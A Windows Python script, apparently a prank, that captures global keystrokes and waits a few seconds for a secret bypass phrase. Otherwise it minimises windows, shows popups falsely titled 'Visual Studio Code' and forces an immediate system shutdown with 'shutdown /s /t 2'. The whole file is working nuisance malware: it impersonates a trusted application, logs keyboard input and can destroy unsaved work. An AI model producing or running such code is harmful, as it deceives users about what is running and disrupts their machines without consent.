import ctypes
import time
import win32gui
import win32con
import os
import threading
import keyboard  # pip install keyboard

HIDDEN_PHRASE = "noah"   # <-- secret phrase typed invisibly
typed_buffer = ""
bypass_triggered = False


# --------------------------
#   KEYLOGGER LISTENER
# --------------------------
def key_listener():
    global typed_buffer, bypass_triggered

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name

            # Ignore special keys
            if len(key) == 1:  
                typed_buffer += key.lower()

                # Keep buffer small
                if len(typed_buffer) > len(HIDDEN_PHRASE):
                    typed_buffer = typed_buffer[-len(HIDDEN_PHRASE):]

                # Check for match
                if HIDDEN_PHRASE in typed_buffer:
                    bypass_triggered = True
                    return


# --------------------------
#    WINDOWS UI FUNCTIONS
# --------------------------
def minimize_vscode():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)

def show_popup(msg, title="Visual Studio Code"):
    ctypes.windll.user32.MessageBoxW(0, msg, title, 0)

def auto_close_popup_after(seconds):
    time.sleep(seconds)
    # closes any MessageBox
    ctypes.windll.user32.PostMessageW(0xffff, 0x0010, 0, 0)

def timed_popup(message, title, timeout):
    t = threading.Thread(target=auto_close_popup_after, args=(timeout,), daemon=True)
    t.start()
    ctypes.windll.user32.MessageBoxW(0, message, title, 0)

# --------------------------
#         MAIN LOGIC
# --------------------------

# Start key listener thread
listener_thread = threading.Thread(target=key_listener, daemon=True)
listener_thread.start()

# Give user time to type the hidden phrase
minimize_vscode()
time.sleep(5)

if bypass_triggered:
    show_popup("Bypass successful. Shutdown canceled.")
    exit()

# Otherwise run payload
minimize_vscode()
minimize_vscode()
minimize_vscode()
time.sleep(0.5)
timed_popup("This PC is ass. Session terminated", "ByeBye", 3)
os.system("shutdown /s /t 2")